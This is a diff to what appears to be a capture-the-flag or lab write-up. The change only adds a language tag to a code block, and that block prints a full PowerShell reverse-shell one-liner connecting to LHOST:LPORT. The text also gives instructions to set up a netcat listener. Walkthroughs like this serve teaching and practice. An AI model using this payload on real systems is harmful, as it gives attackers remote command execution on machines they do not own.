@@ -271,7 +271,7 @@ Lets try to execute the command ```whoami```
 
 nice nice, we can spawn a reverse shell from here using the payload
 
-```
+```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 Ensure you edit the ```LHOST``` and ```LPORT``` before using this. Also, ensure you have your netcat listener listening for incoming connections.
